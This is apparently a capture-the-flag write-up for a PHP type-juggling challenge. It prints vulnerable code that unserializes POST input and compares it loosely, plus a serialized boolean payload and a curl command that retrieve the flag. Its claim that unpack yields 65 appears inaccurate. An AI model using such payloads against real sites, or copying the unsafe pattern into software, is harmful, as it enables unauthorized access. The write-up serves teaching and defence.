---
title: "BabyPHP — Learn-it CTF"
description: "Exploiting PHP loose comparison (type juggling) to bypass a numeric check and retrieve the flag."
pubDate: 2025-02-01
tags: ["web", "php", "learn-it"]
---

**Category:** Web
**Flag:** `LearnIT{php_math_inanutshell}`

## Challenge

The server runs this PHP snippet:

```php
<?php
include 'flag.php';
if($_SERVER["REQUEST_METHOD"] == "POST"){
    $_ = file_get_contents("php://input");
    $__ = unserialize($_);
    $___ = unpack("S*", 0x41)[1];
    if($__['num'] == $___)  { echo $flag; }
} else {
    highlight_file(__FILE__);
}
?>
```

## Analysis

`unpack("S*", 0x41)[1]` unpacks the hex value `0x41` (65 decimal) as an unsigned short — so `$___` equals **65**.

The condition uses `==` (loose comparison), not `===`. This means PHP performs type juggling.

Key insight: in PHP, `true == 65` evaluates to `true` because any non-zero integer is equal to boolean `true` under loose comparison.

## Exploit

Craft a serialized PHP array where `num` is boolean `true`:

```
a:1:{s:3:"num";b:1;}
```

Send it via POST:

```bash
curl -X POST -d 'a:1:{s:3:"num";b:1;}' http://ctf.learn-it.org:40001
```

The server returns the flag.

## Takeaways

- PHP's `==` operator allows type juggling — `true` equals any non-zero number.
- Always use `===` for strict comparisons in security-sensitive code.
- Deserialization of user input is dangerous; always validate before `unserialize()`.
